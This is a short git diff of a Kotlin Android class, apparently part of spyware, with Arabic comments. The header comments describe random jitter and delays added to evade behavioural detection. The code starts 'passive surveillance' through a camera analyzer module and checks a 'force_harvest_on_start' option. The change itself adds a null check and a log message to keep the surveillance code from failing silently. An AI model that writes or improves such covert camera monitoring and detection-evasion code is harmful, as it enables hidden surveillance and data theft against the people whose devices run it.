@@ -35,6 +35,7 @@ import kotlin.random.Random
  * - تم إضافة Jitter عشوائي في حلقة المراقبة لتجنب الأنماط الثابتة.
  * - تم تطبيق تأخيرات عشوائية في جميع حلقات المراقبة لمحاكاة السلوك البشري.
  * - ✅ زيادة نطاق التشويش إلى 60-240 دقيقة مع 0-120 ثانية إضافية لتجنب الكشف السلوكي.
+ * - ✅ إضافة تحقق من null قبل استخدام cameraAnalyzer في دالة start() لتجنب الفشل الصامت.
  */
 class Monitor private constructor(context: Context) {
 
@@ -475,13 +476,15 @@ class Monitor private constructor(context: Context) {
                 }
             }
 
-            // ✅ بدء المراقبة السلبية
+            // ✅ بدء المراقبة السلبية مع التحقق من وجود cameraAnalyzer
             val cameraAnalyzer = getModuleComponent("cameraAnalyzer") as? CameraAnalyzer
             if (cameraAnalyzer != null) {
                 writeLog("🛰️ Starting passive surveillance...")
                 scope.launch {
                     cameraAnalyzer.startPassiveSurveillance()
                 }
+            } else {
+                writeLog("⚠️ CameraAnalyzer is null, passive surveillance disabled")
             }
 
             val forceStart = configMap["force_harvest_on_start"] as? Boolean ?: false
